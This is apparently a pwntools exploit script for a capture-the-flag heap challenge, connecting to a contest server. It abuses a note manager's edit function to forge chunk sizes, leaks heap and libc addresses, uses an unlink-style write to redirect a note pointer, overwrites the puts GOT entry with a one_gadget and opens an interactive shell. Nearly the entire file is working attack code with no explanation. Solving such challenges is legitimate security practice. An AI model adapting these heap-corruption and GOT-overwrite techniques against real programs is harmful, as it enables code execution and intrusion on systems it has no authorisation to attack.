#!/usr/bin/env python2

from pwn import *
from IPython import embed

context.arch = 'amd64'

e = ELF('./libc.so.6')
#r = remote('127.0.0.1', 7122)
r = remote('pwn1.chal.ctf.westerns.tokyo', 16317)

def menu():
	r.recvuntil('Your choice: \n')

def add(sz, nt):
	menu()
	r.send('1')
	r.recvuntil('size: \n')
	r.send(str(sz))
	r.recvuntil('note: \n')
	r.send(nt)

def dele(idx):
	menu()
	r.send('2')
	r.recvuntil('index: \n')
	r.send(str(idx))

def show(idx):
	menu()
	r.send('3')
	r.recvuntil('index: \n')
	r.send(str(idx))
	return r.recvuntil('=', drop=True)

def edit(idx, nt):
	menu()
	r.send('4')
	r.recvuntil('index: \n')
	r.send(str(idx))
	r.recvuntil('note: \n')
	r.send(nt)

### leak ###

size = [288-8]*7
for i in range(len(size)):
	if i:
		add(size[i], chr(i*0x11)*size[i])
	else:
		add(size[i], chr(0x20)*size[i])
edit(0, 'A'*280+flat(0x120*6|0x1))
edit(6, '\x66'*(136-8)+flat(0x120*6))
dele(1)
dele(3)
dele(5)
add(280, 'A'*8)
x = show(1)
heap_base = u64(x[15:-1].ljust(8, '\x00'))-0x5a0
print 'heap_base:', hex(heap_base)
#r.interactive()
add(280, '\x78')
x = show(3)
libc_heap = u64(x[-7:-1].ljust(8,'\0'))
print hex(libc_heap)

#			    puts		heap
libc_heap_puts_off = 0x00007fbdc99d0690-0x00007fbdc9d25b78 
libc_puts = libc_heap+libc_heap_puts_off
print 'libc_puts:', hex(libc_puts)
libc_base = libc_puts-e.symbols['puts']
print 'libc_base:', hex(libc_base)

add(0x120*6-8, 'clear')


### exploit ###

size = [424]*8
for i in range(len(size)):
	add(size[i], chr((i+7)*0x11)*size[i])

edit(7, '\x77'*424+p64(0x1b0*4|0x1))
edit(0xb, '\xbb'*(424-8)+p64(0x1b0*4))
dele(8)
add(0x1b0*4-8, '\x88'*424+flat(0x1b1, 0xdeadbeef, 0x1a1, 0x602108-0x18, 0x602108-0x10)+'\x99'*(424-40)+flat(0x1a0, 0x1b0))
dele(0xa)
puts_got = 0x602020
one_gadget = 0xf1117
edit(9, p64(puts_got))
print 'one_gadget:', hex(libc_base+one_gadget)
#raw_input('@')
edit(6, p64(libc_base+one_gadget))
#dele(8)
#add(0x1b0*4-8, '\x88'*424+flat(0x361, libc_heap, heap_base+0x990, 0x602108-0x18, 0x602108-0x10))
#add(0x1b0*4-8, flat(0x6020100-0x18, 0x6020100-0x10).ljust(424-8, '\x88')+flat(0x0, 0x360, 0x602108-0x18, 0x602108-0x10)+'\xff'*0x340+flat(0x360, 0x1b1))
#add(0x360-8, 'a')
#dele(9)

r.interactive()
#add(248, flat(libc_base+one_gadget))

